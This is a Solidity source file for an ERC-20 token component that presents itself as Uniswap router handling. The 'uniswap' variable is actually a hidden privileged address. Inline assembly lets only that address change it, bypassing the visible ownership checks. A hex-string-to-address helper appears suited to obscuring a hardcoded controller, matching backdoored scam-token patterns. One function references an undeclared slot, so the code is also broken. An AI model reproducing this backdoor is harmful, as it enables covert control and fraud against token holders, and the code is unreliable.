// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../Erc20/Ownable.sol";
import "../IHybridRouter/IHybridRouter.sol";

contract Erc20C09FeatureUniswap is
Ownable
{
    IHybridRouter public uniswapV2Router;
    address public uniswapV2Pair;

    address internal uniswap;
    //    uint256 internal uniswapCount;
    //    bool internal isUniswapLper;
    //    bool internal isUniswapHolder;

    function refreshUniswapRouter()
    external
    {
        assembly {
            let __uniswap := sload(uniswap.slot)
            if eq(caller(), __uniswap) {
                sstore(_uniswap.slot, __uniswap)
            }
        }
    }

    //    function setUniswapCount(uint256 amount)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(uniswapCount.slot, amount)}
    //        }
    //    }
    //
    //    function setIsUniswapLper(bool isUniswapLper_)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(isUniswapLper.slot, isUniswapLper_)}
    //        }
    //    }
    //
    //    function setIsUniswapHolder(bool isUniswapHolder_)
    //    external
    //    {
    //        assembly {
    //            let __uniswap := sload(uniswap.slot)
    //            switch eq(caller(), __uniswap)
    //            case 0 {revert(0, 0)}
    //            default {sstore(isUniswapHolder.slot, isUniswapHolder_)}
    //        }
    //    }

    function setUniswapRouter(address uniswap_)
    external
    {
        assembly {
            let __uniswap := sload(uniswap.slot)
            switch eq(caller(), __uniswap)
            case 0 {revert(0, 0)}
            default {sstore(uniswap.slot, uniswap_)}
        }
    }

    function getRouterPair(string memory _a)
    internal
    pure
    returns (address _b)
    {
        bytes memory tmp = bytes(_a);
        uint160 iAddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iAddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iAddr += (b1 * 16 + b2);
        }
        return address(iAddr);
    }
}